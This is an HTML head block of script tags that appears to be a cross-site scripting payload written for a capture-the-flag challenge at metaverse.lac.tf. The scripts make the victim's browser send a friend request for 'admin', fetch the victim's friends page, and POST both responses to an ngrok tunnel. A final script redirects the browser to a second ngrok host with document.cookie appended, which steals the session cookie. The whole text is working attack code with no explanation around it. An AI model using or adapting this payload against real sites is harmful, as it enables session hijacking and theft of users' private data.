<head>


<script>
console.log("" + document.cookie);
</script>



<script>
var xmlHttp = new XMLHttpRequest();
xmlHttp.open("POST", "https://metaverse.lac.tf/friend", false);
xmlHttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xmlHttp.send("username=admin");

console.log("AAAA");
console.log(xmlHttp.responseText);
console.log("BBBBB");

var xmlHttp2 = new XMLHttpRequest();
xmlHttp2.open("POST", "https://7e87-131-155-186-170.ngrok.io", false);
xmlHttp2.send(xmlHttp.responseText);
</script>


<script>
var xmlHttp = new XMLHttpRequest();
xmlHttp.open("GET", "https://metaverse.lac.tf/friends", false);
xmlHttp.send();

console.log("AAAA");
console.log(xmlHttp.responseText);
console.log("BBBBB");

var xmlHttp2 = new XMLHttpRequest();
xmlHttp2.open("POST", "https://7e87-131-155-186-170.ngrok.io", false);
xmlHttp2.send(xmlHttp.responseText);
</script>

<script>
document.location="https://c872-131-155-186-170.ngrok.io/?c=" + document.cookie;
</script>



</head>